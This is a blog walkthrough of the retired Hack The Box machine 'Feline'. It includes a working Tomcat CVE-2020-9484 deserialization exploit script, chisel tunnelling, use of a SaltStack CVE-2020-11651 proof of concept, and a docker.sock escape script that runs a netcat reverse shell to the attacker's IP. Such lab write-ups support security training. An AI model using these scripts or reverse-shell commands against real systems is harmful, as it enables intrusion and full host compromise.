---
layout: post  
title: "Feline: Hack The Box Walkthrough"
date: 2021-02-22 02:47:51 +0000
last_modified_at: 2021-02-22 02:47:51 +0000
category: Walkthrough
tags: ["Hack The Box", Feline, retired, Linux, Hard]
comments: true
protect: false
image:
  feature: feline-htb-walkthrough.png
---

This post documents the complete walkthrough of Feline, a retired vulnerable [VM][1] created by [MinatoTW][2] and [MrR3boot][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post
{:.no_toc}

* TOC
{:toc}

## Background

Feline is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.205 --rate=500

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-08-30 07:25:31 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 8080/tcp on 10.10.10.205
Discovered open port 22/tcp on 10.10.10.205
```

Nothing extraordinary. Let's do one better with `nmap` scanning the discovered ports to establish their services.

```
# nmap -n -v -Pn -p22,8080 -A --reason 10.10.10.205 -oN nmap.txt
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    syn-ack ttl 63 Apache Tomcat 9.0.27
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: VirusBucket
```

VirusBucket? Sure sounds interesting. This is what it looks like.

{% include image.html image_alt="9e405e74.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/9e405e74.png" %}

### VirusBucket Malware Analysis Service

There's an interesting service that VirusBucket provides—malware analysis.

{% include image.html image_alt="ccc684a6.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/ccc684a6.png" %}

### Apache Tomcat 9.x vulnerabilities

The good thing about Apache is that they are very open with the vulnerabilities in their products. And since we have a Tomcat 9.0.27 here, it's logical to look for [vulnerabilities](https://tomcat.apache.org/security-9.html) that will grant us remote code execution from 9.0.29 onward.

#### CVE-2020-1938: AJP Request Injection and potential Remote Code Execution

Right off the bat, I set my sights on CVE-2020-1938 only to realize that the AJP Connector via `8009/tcp` is not enabled.

{% include image.html image_alt="e541749b.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/e541749b.png" %}

#### CVE-2020-9484: Remote Code Execution via session persistence

Fret not. The next vulnerability CVE-2020-9484 seems like a good fit. We can control the contents and name of the file uploaded, since it's a malware analysis service (it has to accept all kind of files). One small problem though, we don't know the location of where the files are uploaded to and whether the combination of `PersistentManager` and `FileStore` is used.

{% include image.html image_alt="93dc2203.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/93dc2203.png" %}

One of the best samples to test a malware analysis service is to use the [EICAR](https://www.eicar.org/?page_id=3950) sample.

```
X5O!P%@AP\[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*
```

Let's upload the sample through Burp proxy.

{% include image.html image_alt="23ea18d7.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/23ea18d7.png" %}

There you have it. Meanwhile at Burp, we get to look closer at the POST request.

{% include image.html image_alt="863f44bf.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/863f44bf.png" %}

And the POST response.

{% include image.html image_alt="b594e4c2.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/b594e4c2.png" %}

Sending the request to Burp's Repeater is where we can truly test the various parameters. Putting on my developer's hat, a thought came to me. What if we omit the filename, maybe Java will spit out some information about not finding the file? Let's give it a shot.

Here's the request.

{% include image.html image_alt="c850e365.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/c850e365.png" %}

And here's the response.

{% include image.html image_alt="c2964d10.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/c2964d10.png" %}

Awesome. We now know what the files are stored but we still don't know if `PersistentManager` and `FileStore` are used.

## Foothold

The only write-up on CVE-2020-9484 that I could find is a blog [post](https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/) by Red Timmy Security. My exploit is heavily based on the write-up. The only assumption is that `PersistentManager` and `FileStore` are used, and that each uploaded sample is associated with a session and that session is saved on disk.

The exploit comes in a form of a shell script, driven by `curl` and `ysoserial`. I already had `ysoserial.jar` built and the command `ysoserial` mapped as follows:

```bash
#!/bin/bash

YSOSERIAL="/root/Downloads/repo/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar"
java -jar $YSOSERIAL "$@"
```

Here's my exploit

<div class="filename"><span>exploit.sh</span></div>

```bash
#!/bin/bash

HOST=10.10.10.205
PORT=8080
EMAIL="nobody%40example.com"
CMD=$1
PAYLOAD=$(mktemp -u)

ysoserial CommonsCollections4 "$CMD" > ${PAYLOAD}.session

curl -s \
     -F "image=@${PAYLOAD}.session" \
     -o /dev/null \
     "http://$HOST:$PORT/upload.jsp?email=$EMAIL"

curl -s \
     -b "JSESSIONID=../../../../../opt/samples/uploads/$(basename $PAYLOAD)" \
     -o /dev/null \
     "http://$HOST:$PORT/upload.jsp?email=$EMAIL"

rm -rf ${PAYLOAD}.session
```

Let's have the exploit script download a copy of `nc` with the `-e` switch, make it executable and then run a reverse shell back to us.

{% include asciinema.html url="https://asciinema.org/a/6Q3OSRe3HxB4POskZi4raELHU" title="Running exploit.sh" author="limbernie" poster="npt:0:50" preload="preload" %}

The file `user.txt` is at `tomcat`'s home directory.

{% include image.html image_alt="9cc988fc.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/9cc988fc.png" %}

## Privilege Escalation

During enumeration of `tomcat`'s account, I notice the following listening ports.

{% include image.html image_alt="07ec170f.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/07ec170f.png" %}

Ports `4505/tcp` and `4506/tcp` suggests the presence of a Salt Master. If I had to guess, I would say that the Salt Master is actually a docker container because I didn't find any SaltStack installation in VirusBucket.

### CVE-2020-11651 - Authentication bypass vulnerabilities

SaltStack 3000.1 is susceptible to an authentication bypass vulnerability that allows an unauthenticated attacker to _connect to the "request server" port (`4506/tcp`) to control and publish arbitrary control messages, read and write files anywhere on the "master" server filesystem and steal the secret key used to authenticate to the master as root_.

In short, we can exploit CVE-2020-11651 to gain access to the docker container. A proof-of-concept [exploit](https://github.com/jasperla/CVE-2020-11651-poc) can be easily found by googling ""**CVE-2020-11651 exploit**".

But first, we need to forward `4506/tcp` to our attacking machine. This is achieved with `chisel` in the absence of SSH access. Trust me, I've tried to create `/home/tomcat/.ssh/authorized_keys` but was denied write access to `tomcat`'s own home directory. :laughing:

*Set up `chisel` server at your attacking machine*

```
# chisel server -p 9999 --reverse
```

*Download `chisel` to VirusBucket and forward `4506/tcp` to your machine*

```
$ ./chisel client 10.10.14.22:9999 R:4506:127.0.0.1:4506 &
```

Similarly, the plan is to download a copy of `nc` with the `-e` switch to the docker container, make it executable and then run a reverse shell back to us.

{% include image.html image_alt="b99fdf5d.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/b99fdf5d.png" %}

{% include image.html image_alt="eba0cbe9.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/eba0cbe9.png" %}

{% include image.html image_alt="6887f573.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/6887f573.png" %}

Meanwhile at my `nc` listener...

{% include image.html image_alt="30ec0c80.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/30ec0c80.png" %}

The docker container is indeed the Salt Master.

{% include image.html image_alt="69c8ebe1.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/69c8ebe1.png" %}

### The danger of an exposed `docker.sock`

During enumeration of the docker container, I found the presence of the docker socket.

{% include image.html image_alt="56eccba0.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/56eccba0.png" %}

Notice the `118`? That's the `docker` group of the host operating system.

This [article](https://dejandayoff.com/the-danger-of-exposing-docker.sock/) talks a great deal about the danger of exposing `docker.sock` but to me what stood out as the most important aspect was this,

> Don't forget to add `chroot /hostos` if you want to run the command against the Host OS.

Armed with this insight and reference to the Docker Engine [API](https://docs.docker.com/engine/api/v1.40/), we could create and start a container by virtue of having an exposed `docker.sock`.

_List Images_

```json
# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
[
  {
    "Containers": -1,
    "Created": 1590787186,
    "Id": "sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
    "Labels": null,
    "ParentId": "",
    "RepoDigests": null,
    "RepoTags": [
      "sandbox:latest"
    ],
    "SharedSize": -1,
    "Size": 5574537,
    "VirtualSize": 5574537
  },
  {
    "Containers": -1,
    "Created": 1588544489,
    "Id": "sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
    "Labels": null,
    "ParentId": "",
    "RepoDigests": [
      "<none>@<none>"
    ],
    "RepoTags": [
      "<none>:<none>"
    ],
    "SharedSize": -1,
    "Size": 1056679100,
    "VirtualSize": 1056679100
  }
]
```

Looks like we already have an image (`sandbox:latest`) to work with. To facilitate things a little bit, I wrote the following script meant for execution in the container.

<div class="filename"><span>root.sh</span></div>

```bash
#!/bin/bash

CMD="/dev/shm/nc 10.10.14.22 4444 -e /bin/bash"
PAYLOAD="[\"/bin/sh\",\"-c\",\"chroot /mnt sh -c \\\"$CMD\\\"\"]"
RESPONSE=$(curl -s \
                -XPOST \
                --unix-socket /var/run/docker.sock \
                -d "{\"Image\":\"sandbox\",\"Cmd\":$PAYLOAD, \"Binds\": [\"/:/mnt:rw\"]}" \
                -H 'Content-Type: application/json' \
                "http://localhost/containers/create")
CID=$(cut -d'"' -f4 <<<"$RESPONSE")

# start the container
curl -s \
     -XPOST \
     --unix-socket /var/run/docker.sock \
     "http://localhost/containers/$CID/start"
```

Copy `nc` to `/dev/shm` for the script to work. It shouldn't matter but I think there's a `cron` job to delete `tmpfs` contents and that includes `/dev/shm` as well. :smirk:

You know the end is near when you see this.

{% include image.html image_alt="b24652f5.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/b24652f5.png" %}

Indeed. The `cron` job I spoke about earlier.

{% include image.html image_alt="a872377d.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/a872377d.png" %}

The file `root.txt` is at `root`'s home directory of course.

{% include image.html image_alt="bb059572.png" image_src="/dfe82658-388a-4b1e-ae58-44b4417f84b0/bb059572.png" %}

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/274
[2]: https://www.hackthebox.eu/home/users/profile/8308
[3]: https://www.hackthebox.eu/home/users/profile/13531
[4]: https://www.hackthebox.eu/
